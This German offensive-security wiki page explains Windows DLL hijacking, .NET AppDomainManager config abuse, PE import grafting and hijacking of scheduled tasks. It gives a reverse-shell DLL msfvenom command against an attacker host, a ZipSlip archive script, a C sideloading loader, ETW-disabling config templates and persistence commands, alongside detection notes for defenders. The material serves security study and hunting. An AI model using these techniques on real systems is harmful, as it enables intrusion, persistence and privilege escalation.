# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Bei DLL Hijacking wird eine vertrauenswürdige Anwendung dazu gebracht, eine schädliche DLL zu laden. Der Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Es wird hauptsächlich zur Codeausführung und zum Erreichen von Persistenz und seltener zur Privilegieneskalation eingesetzt. Obwohl hier der Fokus auf der Eskalation liegt, bleibt die Hijacking-Methode unabhängig vom Ziel dieselbe.

### Gängige Techniken

Für DLL Hijacking kommen mehrere Methoden zum Einsatz. Wie effektiv sie sind, hängt von der DLL-Ladestrategie der Anwendung ab:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Eine echte DLL wird durch eine schädliche ersetzt. Optional kann DLL Proxying verwendet werden, um die Funktionalität der ursprünglichen DLL beizubehalten.
2. **DLL Search Order Hijacking**: Die schädliche DLL wird in einem Suchpfad vor der legitimen platziert, um das Suchmuster der Anwendung auszunutzen.
3. **Phantom DLL Hijacking**: Eine schädliche DLL wird erstellt, die eine Anwendung laden soll, weil sie annimmt, dass es sich um eine vorhandene, benötigte DLL handelt.
4. **DLL Redirection**: Suchparameter wie `%PATH%` oder Dateien vom Typ `.exe.manifest` / `.exe.local` werden geändert, um die Anwendung zur schädlichen DLL zu leiten.
5. **WinSxS DLL Replacement**: Die legitime DLL wird im WinSxS-Verzeichnis durch eine schädliche ersetzt. Diese Methode wird oft mit DLL side-loading in Verbindung gebracht.
6. **Relative Path DLL Hijacking**: Die schädliche DLL wird in einem benutzerkontrollierten Verzeichnis zusammen mit der kopierten Anwendung platziert. Dies ähnelt Binary Proxy Execution-Techniken.

Eine Anwendung kann auch einen **eigenen DLL loader** implementieren. Ein privilegierter Prozess kann ein untergeordnetes Verzeichnis wie `Libraries` oder `Plugins` aufzählen und eine ausgewählte DLL an einen Helper übergeben – unabhängig von der normalen Windows-DLL-Suchreihenfolge. Wenn ein anderes Konto Dateien in genau diesem Verzeichnis erstellen kann, sollte dies als Ansatzpunkt für eine Überprüfung behandelt werden: Bestätige die Prozessidentität, die effektive ACL des Verzeichnisses, die Dateiauswahlregel und einen erreichbaren Ladevorgang. Ein beschreibbares Verzeichnis neben einer ausführbaren Datei belegt nicht, dass der Prozess DLLs daraus lädt.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### PE-Import-Grafting nach der Installation

Beim klassischen Side-Loading bleibt die vertrauenswürdige PE unverändert, und die Auflösung des DLL-Namens wird ausgenutzt. **Import grafting** verändert stattdessen eine PE, die bereits vom vertrauenswürdigen Programm geladen wurde. Der Angreifer fügt einen Import-Deskriptor sowie die zugehörigen Lookup-/IAT-Einträge für eine vom Angreifer kontrollierte DLL hinzu. Wenn Windows diese Abhängigkeit rekursiv auflöst, lädt es die hinzugefügte DLL und führt deren Initialisierungscode innerhalb des ansonsten legitimen Prozesses aus. Dies ist eine Änderung an einer PE auf der Festplatte und nicht dasselbe wie das Ersetzen eines live IAT-Funktionszeigers durch einen Runtime-Hook.<sup>[[26]](#references)[[27]](#references)</sup>

Die modifizierte PE kann eine zwischengeschaltete Hersteller-DLL sein und muss nicht die ausführbare Datei sein, die vom Benutzer oder vom Task Scheduler gestartet wird. Eine wiederverwendbare Angriffskette sieht folgendermaßen aus:<sup>[[27]](#references)</sup>

1. Kopiere die legitime ausführbare Datei und ihre Abhängigkeiten in ein vom Angreifer kontrolliertes Verzeichnis.
2. Ändere die Importstrukturen einer Abhängigkeit so, dass sie auf die schädliche DLL verweisen, und behalte dabei die erwarteten Exporte und das normale Verhalten der Abhängigkeit bei.
3. Konfiguriere einen Autorun-Eintrag oder eine geplante Aufgabe, um die legitime ausführbare Datei zu starten. Der Loader lädt die geänderte Abhängigkeit und anschließend die neu importierte DLL. Siehe [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) zur Auflistung von Aufgaben.
4. Vermeide aufwendige Arbeiten in `DllMain`; der beobachtete Loader erstellte einen Worker-Thread und setzte die gestaffelte Entschlüsselung dort fort.

Dies unterscheidet sich von einer Supply-Chain-Kompromittierung auf Herstellerseite, wenn das Herstellerpaket sauber ist und die Importänderung erst nach der Installation erfolgt. Überprüfe alle Module im bereitgestellten Verzeichnis, nicht nur die Host-EXE: Vergleiche die Importlisten und Hashes der Abhängigkeiten mit einer bekanntermaßen sauberen Installation, überprüfe die Signaturen und untersuche Hersteller-Binärdateien, die von unerwarteten beschreibbaren Speicherorten wie `C:\ProgramData` gestartet werden. Eine geplante Aufgabe, die auf einen kopierten Crash-Reporter oder Updater in einem solchen Verzeichnis verweist, ist ein besonders hilfreicher Ansatzpunkt.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + Angreifer-Assembly)

Klassisches DLL side-loading ist nicht die einzige Möglichkeit, einen vertrauenswürdigen **.NET Framework**-Prozess dazu zu bringen, Angreifercode zu laden. Wenn es sich bei der Zieldatei um eine **managed** Anwendung handelt, liest die CLR auch eine nach der ausführbaren Datei benannte **Anwendungskonfigurationsdatei** (zum Beispiel `Setup.exe.config`). In dieser Datei kann ein benutzerdefinierter **AppDomainManager** definiert werden. Wenn die Konfiguration auf eine vom Angreifer kontrollierte Assembly neben der EXE verweist, lädt die CLR diese **vor dem normalen Ausführungspfad der Anwendung** und führt sie im vertrauenswürdigen Prozess aus.<sup>[[24]](#references)</sup>

Laut Microsofts .NET Framework-Konfigurationsschema müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale Konfiguration:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimaler Manager:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktische Hinweise:
- Dieses Tradecraft ist **spezifisch für .NET Framework**. Es hängt von der CLR-Konfigurationsanalyse ab, nicht von der Win32-DLL-Suchreihenfolge.
- Beim Host muss es sich tatsächlich um eine **managed EXE** handeln. Schnelle Triage: `sigcheck -m target.exe`, `corflags target.exe` oder nach dem **CLR Runtime Header** in den PE-Metadaten suchen.
- Der Name der Config-Datei muss exakt dem Namen der ausführbaren Datei entsprechen (`<binary>.config`) und sie liegt üblicherweise **neben der EXE**.
- Dies ist bei **signierten Microsoft-/Vendor-Binaries** nützlich, da die vertrauenswürdige EXE unverändert bleibt, während die schädliche managed Assembly im selben Prozess ausgeführt wird.
- Wenn bereits ein beschreibbares Installer-/Update-Verzeichnis vorhanden ist, kann AppDomainManager-Hijacking als **erste Stufe** eingesetzt werden, gefolgt von klassischem DLL-Sideloading oder Reflective Loading für spätere Stufen.

### AppDomainManager als Downloader + Bootstrap für Scheduled Tasks

Ein praktisches Intrusion-Muster besteht darin, die vertrauenswürdige managed EXE mit einer schädlichen `*.config` und einer schädlichen AppDomainManager-DLL zu kombinieren, die nur als **kleiner Bootstrapper** dient:<sup>[[25]](#references)</sup>

1. Der Benutzer startet einen signierten .NET-Installer oder Updater von einem glaubwürdigen Speicherort wie `%USERPROFILE%\Downloads`.
2. Die benachbarte Config veranlasst die CLR, die Angreifer-Assembly zu laden, **bevor** die Logik der legitimen App startet.
3. Der schädliche Manager führt eine **Pfadprüfung** durch (zum Beispiel nur fortfahren, wenn die Host-EXE aus `Downloads` ausgeführt wird, und die zweite Stufe nur aus `%LOCALAPPDATA%` starten lassen).
4. Wenn die Prüfung erfolgreich ist, lädt er die eigentliche Payload in einen für den Benutzer beschreibbaren Pfad wie `%LOCALAPPDATA%\PerfWatson2.exe` herunter und richtet Persistenz mit einer Scheduled Task ein.

Warum diese Variante wichtig ist:
- Die signierte Host-EXE bleibt unverändert, sodass eine Triage, die nur den Hash der Hauptdatei prüft, den Kompromiss möglicherweise nicht erkennt.
- Einfaches **pfadbasiertes Anti-Analysis** ist weit verbreitet: Das Verschieben des ZIP/EXE/DLL-Trios auf den Desktop, nach Temp oder in einen Sandbox-Pfad kann die Angriffskette absichtlich unterbrechen.
- Die AppDomainManager-DLL der ersten Stufe kann klein und unauffällig bleiben, während das eigentliche Implantat später abgerufen wird.

Minimales Persistenzbeispiel, das bei diesem Muster häufig vorkommt:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notizen:
- ` /rl highest` bedeutet **höchste verfügbare Berechtigung** für diesen Benutzer/diese Sitzung; für sich genommen garantiert es keine SYSTEM-Eskalation.
- Diese Technik wird oft eher als **Ausführung/Persistenz durch .NET-Konfigurationsmissbrauch** denn als klassisches Hijacking der DLL-Suchreihenfolge bei fehlenden DLLs eingeordnet, obwohl Angreifer beides häufig miteinander verketten.

Erkennungshinweise:
- Signierte .NET-Executables, die aus **ZIP-Entpackpfaden**, `Downloads`, `%TEMP%` oder anderen für Benutzer beschreibbaren Ordnern gestartet werden und neben denen sich eine `<exe>.config` befindet.
- Neue geplante Tasks, deren Aktion auf `%LOCALAPPDATA%`, `%APPDATA%` oder `Downloads` verweist und deren Namen denen von Browser- oder Hersteller-Updatern ähneln.
- Kurzlebige verwaltete Bootstrap-Prozesse, die sofort eine weitere EXE herunterladen und anschließend `schtasks.exe` starten.
- Samples, die vorzeitig beendet werden, sofern der Pfad des Executables nicht einem erwarteten Benutzerprofilverzeichnis entspricht.

### Hijacking eines vorhandenen geplanten Tasks zum erneuten Starten der Sideload-Kette

Suchen Sie bei der Persistenz nicht nur nach dem **Erstellen eines neuen Tasks**. Einige Intrusion Sets warten, bis ein legitimer Installer einen **regulären Updater-Task** erstellt, und ändern dann die Task-Aktion, sodass Name, Autor und Trigger für Verteidiger vertraut bleiben.

Wiederverwendbarer Workflow:
1. Installieren/Starten Sie die legitime Software und ermitteln Sie den Task, den sie normalerweise erstellt.
2. Exportieren Sie die Task-XML und notieren Sie die aktuellen Werte von `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Ersetzen Sie nur die Aktion, sodass der Task Ihre **vertrauenswürdige Host-EXE** aus einem für Benutzer beschreibbaren Staging-Verzeichnis startet, die dann die echte Payload per Sideload oder AppDomain lädt.
4. Registrieren Sie denselben Task-Namen erneut, statt ein neues, offensichtliches Persistenzartefakt zu erstellen.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Warum es unauffälliger ist:
- Der Aufgabenname kann weiterhin legitim aussehen (zum Beispiel wie der eines Updaters eines Herstellers).
- Der **Task Scheduler service** startet die Aufgabe. Bei der Validierung von Eltern- und Vorfahrenprozessen wird daher oft die erwartete Scheduling-Kette statt `explorer.exe` angezeigt.
- DFIR-Teams, die nur nach **neuen Aufgabennamen** suchen, übersehen möglicherweise eine Aufgabe, deren Registrierung bereits vorhanden war, deren Aktion jetzt aber auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen vom Angreifer kontrollierten Pfad verweist.

Schnelle Ansatzpunkte für die Suche:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche die XML-Dateien unter `C:\Windows\System32\Tasks\*` und die Metadaten unter `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` mit einer Baseline.
- Erzeuge einen Alert, wenn eine **wie ein Hersteller-Updater aussehende Aufgabe** aus **benutzerbeschreibbaren Verzeichnissen** ausgeführt wird oder eine .NET-EXE mit einer danebenliegenden `*.config`-Datei startet.

> [!TIP]
> Eine schrittweise Angriffskette, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implants mit DLL-Sideloading kombiniert, findest du im folgenden Ablauf.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende DLLs finden

Am häufigsten findet man fehlende DLLs auf einem System, indem man [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals ausführt und **die folgenden zwei Filter einstellt**:

![Gängige Techniken – Fehlende DLLs finden: Am häufigsten findet man fehlende DLLs auf einem System, indem man procmon von Sysinternals ausführt und die folgenden zwei Filter einstellt](<../../../images/image (961).png>)

![Gängige Techniken – Fehlende DLLs finden: Am häufigsten findet man fehlende DLLs auf einem System, indem man procmon von Sysinternals ausführt und die folgenden zwei Filter einstellt](<../../../images/image (230).png>)

und nur die **File System Activity** anzeigt:

![Gängige Techniken – Fehlende DLLs finden: und nur die File System Activity anzeigen](<../../../images/image (153).png>)

Wenn du allgemein nach **fehlenden DLLs** suchst, **lässt** du die Aufzeichnung einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL in einer bestimmten ausführbaren Datei** suchst, füge einen weiteren Filter hinzu, etwa **"Process Name" "contains" `<exec name>`**, führe die Datei aus und beende die Ereigniserfassung.<sup>[[9]](#references)</sup>

## Fehlende DLLs ausnutzen

Um deine Berechtigungen zu erweitern, suche nach einer **DLL, die ein privilegierter Prozess von einem Pfad zu laden versucht, in den du schreiben kannst**. Das kann passieren, wenn du ein Verzeichnis kontrollierst, das in der Suchreihenfolge vor dem Verzeichnis mit der legitimen DLL liegt, oder wenn die angeforderte DLL nicht existiert und du in eines der durchsuchten Verzeichnisse schreiben kannst.

### DLL-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **findest du eine genaue Beschreibung, wie DLLs geladen werden.**

**Windows-Anwendungen** suchen nach DLLs, indem sie eine Reihe **vordefinierter Suchpfade** in einer bestimmten Reihenfolge durchgehen. DLL hijacking wird möglich, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse abgelegt wird, sodass sie vor der legitimen DLL geladen wird. Um dies zu verhindern, sollte die Anwendung beim Verweisen auf benötigte DLLs absolute Pfade verwenden.

Die **DLL-Suchreihenfolge auf 32-Bit-Systemen** sieht wie folgt aus:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), um den Pfad dieses Verzeichnisses zu erhalten.(_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, mit der sich der Pfad dieses Verzeichnisses ermitteln lässt, es wird jedoch durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), um den Pfad dieses Verzeichnisses zu erhalten.
   1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der Umgebungsvariable PATH aufgeführt sind. Beachte, dass der anwendungsspezifische Pfad, der im Registrierungsschlüssel **App Paths** angegeben ist, nicht dazugehört. Der Schlüssel **App Paths** wird bei der Berechnung des DLL-Suchpfads nicht verwendet.

Dies ist die **Standard**-Suchreihenfolge bei aktiviertem **SafeDllSearchMode**. Ist die Funktion deaktiviert, rückt das aktuelle Verzeichnis auf den zweiten Platz vor. Um diese Funktion zu deaktivieren, erstelle den Registrierungswert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig ist die Funktion aktiviert).

Wird die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Eine DLL kann schließlich auch über ihren absoluten Pfad statt über ihren Namen geladen werden. In diesem Fall sucht Windows die DLL selbst nur an diesem Pfad. Abhängigkeiten, die über ihren Namen angefordert werden, folgen weiterhin der jeweils geltenden Suchreihenfolge.

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde sie hier nicht erklären.

### Einen beliebigen Datei-Schreibzugriff mit einem Missing-DLL-Hijack verketten

**Verwandte Technik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu erfassen, nach denen der Prozess sucht, die er aber nicht findet.<sup>[[14]](#references)</sup>
2. Wenn die Binärdatei über einen **Zeitplan/einen Dienst** ausgeführt wird, wird eine DLL mit einem dieser Namen im **Anwendungsverzeichnis** (Eintrag Nr. 1 der Suchreihenfolge) beim nächsten Start geladen. In einem .NET-Scanner-Beispiel suchte der Prozess in `C:\samples\app\` nach `hostfxr.dll`, bevor er die echte DLL aus `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine Payload-DLL (z. B. eine Reverse Shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn deine Primitive ein **ZipSlip-ähnlicher beliebiger Schreibzugriff** ist, erstelle eine ZIP-Datei mit einem Eintrag, der aus dem Extraktionsverzeichnis ausbricht, damit die DLL im Anwendungsverzeichnis landet:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Stelle das Archiv im überwachten Posteingang/Share bereit; wenn die geplante Aufgabe den Prozess erneut startet, lädt dieser die bösartige DLL und führt deinen Code als Dienstkonto aus.

### Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen

Eine fortgeschrittene Möglichkeit, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, beim Erstellen des Prozesses mit den nativen APIs von ntdll das Feld DllPath in RTL_USER_PROCESS_PARAMETERS festzulegen. Indem du hier ein vom Angreifer kontrolliertes Verzeichnis angibst, kann ein Zielprozess, der eine importierte DLL anhand ihres Namens auflöst (kein absoluter Pfad und keine sicheren Lade-Flags), dazu gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Grundidee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner verweist (z. B. das Verzeichnis, in dem sich dein Dropper/Unpacker befindet).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Zieldatei eine DLL anhand ihres Namens auflöst, berücksichtigt der Loader bei der Auflösung den angegebenen DllPath. So wird zuverlässiges Sideloading ermöglicht, selbst wenn sich die bösartige DLL nicht neben der Ziel-EXE befindet.

Hinweise/Einschränkungen
- Dies betrifft den zu erstellenden untergeordneten Prozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess betrifft.
- Das Ziel muss eine DLL anhand ihres Namens importieren oder LoadLibrary dafür verwenden (kein absoluter Pfad und keine Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und fest codierte absolute Pfade können nicht hijacked werden. Weitergeleitete Exporte und SxS können die Priorität ändern.

Minimales C-Beispiel (ntdll, Wide-Strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: DLL-Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operatives Anwendungsbeispiel
- Platziere eine schädliche xmllite.dll (die erforderlichen Funktionen exportierend oder als Proxy zur echten DLL) in deinem DllPath-Verzeichnis.
- Starte eine signierte Binary, von der bekannt ist, dass sie mithilfe der oben beschriebenen Technik xmllite.dll anhand ihres Namens sucht. Der Loader löst den Import über den angegebenen DllPath auf und sideloadet deine DLL.

Diese Technik wurde in freier Wildbahn beobachtet, um mehrstufige Sideloading-Ketten auszuführen: Ein initialer Launcher legt eine Hilfs-DLL ab, die anschließend eine von Microsoft signierte, hijackbare Binary mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem Staging-Verzeichnis zu erzwingen.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking über `.exe.config`

Bei **.NET Framework**-Zielen kann Sideloading **vor `Main()`** erfolgen, ohne den Speicher zu patchen, indem die benachbarte **`.exe.config`**-Datei der Anwendung ausgenutzt wird. Statt sich ausschließlich auf die Win32-DLL-Suchreihenfolge zu verlassen, platziert der Angreifer eine legitime .NET-EXE neben einer schädlichen Konfigurationsdatei und einer oder mehreren vom Angreifer kontrollierten Assemblies.

So funktioniert die Kette:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die Host-EXE wird gestartet und die **CLR liest `<exe>.config`**.
2. Die Konfiguration setzt **`<appDomainManagerAssembly>`** und **`<appDomainManagerType>`**, damit die Runtime einen vom Angreifer kontrollierten `AppDomainManager` instanziiert.
3. Der schädliche Manager erhält **Ausführung vor `Main()`** innerhalb des vertrauenswürdigen Host-Prozesses.
4. Dieselbe Konfiguration kann die CLR dazu zwingen, zuerst lokale Assemblies aufzulösen (zum Beispiel `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) und die Runtime-Validierung bzw. Telemetrie ohne Inline-Patching zu schwächen.

Kampagnenartiges Muster (die genaue Verschachtelung kann je nach Direktive/CLR-Version variieren):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Warum dies nützlich ist:
- **`<probing privatePath="."/>`** beschränkt die Assembly-Auflösung auf das Anwendungsverzeichnis und macht den Ordner so zu einer vorhersehbaren Sideloading-Angriffsfläche.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Code des Angreifers, bevor die eigentliche Anwendungslogik ausgeführt wird.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann es einer Full-Trust-Anwendung ermöglichen, unsignierte oder manipulierte Assemblies zu laden, ohne dass die Strong-Name-Validierung fehlschlägt.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** verhindert durch Publisher-Richtlinien ausgelöste Weiterleitungen zu neueren Assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sorgt für eine deterministischere Runtime-Auswahl.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** ist besonders interessant, weil die **CLR ihre eigene ETW-Sichtbarkeit über die Konfiguration deaktiviert**, anstatt dass das Implantat `EtwEventWrite` im Speicher patcht.

In aktuellen Kampagnen beobachtetes Vorgehen:
- Phase 1 legt `setup.exe`, `setup.exe.config` und lokale Assemblies ab.
- Phase 2 kopiert sie in einen glaubwürdig wirkenden **AppData-Update**-Ordner, benennt den Host in etwas wie `update.exe` um und startet ihn über eine **geplante Aufgabe** erneut.
- Phase 3 überprüft den Ausführungskontext (zum Beispiel, ob der erwartete übergeordnete Prozess `svchost.exe` von Task Scheduler ist), bevor die finale RAT-DLL bzw. der finale Export geladen wird.

Ansätze für die Suche:
- Signierte oder anderweitig legitime **.NET-Executables**, die an verdächtigen, benachbarten **`.config`**-Dateien in benutzerschreibbaren Speicherorten ausgeführt werden.
- `.config`-Dateien mit **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`**.
- Geplante Aufgaben, die umbenannte Update-Binaries aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen Verzeichnissen wie `\bin\update\` erneut starten.
- Übergeordnete und untergeordnete Prozessketten, in denen eine geplante Aufgabe einen vertrauenswürdigen .NET-Host startet, der sofort nicht vom Hersteller stammende Assemblies aus seinem eigenen Verzeichnis lädt.

#### Ausnahmen von der DLL-Suchreihenfolge laut Windows-Dokumentation

In der Windows-Dokumentation werden bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge beschrieben:

- Wenn eine **DLL gefunden wird, deren Name mit dem einer bereits im Speicher geladenen DLL übereinstimmt**, umgeht das System die übliche Suche. Stattdessen prüft es zunächst auf Weiterleitungen und ein Manifest, bevor es auf die bereits im Speicher befindliche DLL zurückgreift. **In diesem Szenario sucht das System nicht nach der DLL**.
- Wird eine DLL für die aktuelle Windows-Version als **known DLL** erkannt, verwendet das System die Version dieser known DLL sowie alle davon abhängigen DLLs, **ohne eine Suche durchzuführen**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser known DLLs.
- Hat eine **DLL Abhängigkeiten**, wird nach diesen abhängigen DLLs gesucht, als wären sie nur anhand ihrer **Modulnamen** angegeben worden – unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad gefunden wurde.

### Privilegien eskalieren

**Voraussetzungen**:

- Einen Prozess identifizieren, der mit **anderen Privilegien** ausgeführt wird oder ausgeführt werden soll (horizontale oder laterale Bewegung) und dem eine **DLL fehlt**.
- Sicherstellen, dass **Schreibzugriff** auf ein beliebiges **Verzeichnis** besteht, in dem nach der **DLL** gesucht wird. Dies kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Diese Voraussetzungen sind standardmäßig selten erfüllt: Bei privilegierten ausführbaren Dateien fehlen normalerweise keine DLL-Abhängigkeiten, und Standardbenutzer können üblicherweise nicht in Verzeichnisse des System-Suchpfads schreiben. Fehlkonfigurierte Umgebungen können jedoch beide Bedingungen erfüllen.\
Wenn die Voraussetzungen erfüllt sind, prüfe das Projekt [UACME](https://github.com/hfiref0x/UACME). Obwohl es hauptsächlich um UAC bypass geht, enthält es DLL-Hijacking-PoCs für bestimmte Windows-Versionen, die sich oft an das von dir gefundene beschreibbare Verzeichnis anpassen lassen.

